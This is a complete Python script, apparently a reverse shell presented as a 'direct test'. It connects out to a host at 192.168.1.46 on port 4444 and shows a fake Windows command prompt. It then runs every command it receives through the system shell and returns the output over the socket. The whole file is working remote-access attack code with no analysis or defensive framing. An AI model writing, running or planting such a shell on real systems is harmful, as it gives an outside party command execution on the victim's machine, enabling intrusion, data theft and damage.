#!/usr/bin/env python3

import socket
import subprocess
import os

def direct_test():
    SERVER_HOST = "192.168.1.46"
    SERVER_PORT = 4444
    
    print(f"Direct test - connecting to {SERVER_HOST}:{SERVER_PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))
        print("Direct connection established!")
        
        # Send immediate test messages
        s.send(b"DIRECT TEST CONNECTION\r\n")
        s.send(b"This is a direct test from Python\r\n")
        s.send(b"Ready for commands:\r\n")
        s.send(b"C:\\> ")
        
        # Simple command loop
        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                print(f"Received: {command}")
                
                if command.lower() in ['exit', 'quit']:
                    s.send(b"Goodbye!\r\n")
                    break
                
                # Execute command
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "[No output]\n"
                except Exception as e:
                    output = f"[Error: {str(e)}]\n"
                
                s.send(output.encode('utf-8', errors='ignore'))
                s.send(b"\r\nC:\\> ")
                
            except Exception as e:
                print(f"Loop error: {e}")
                break
        
        s.close()
        
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    direct_test()
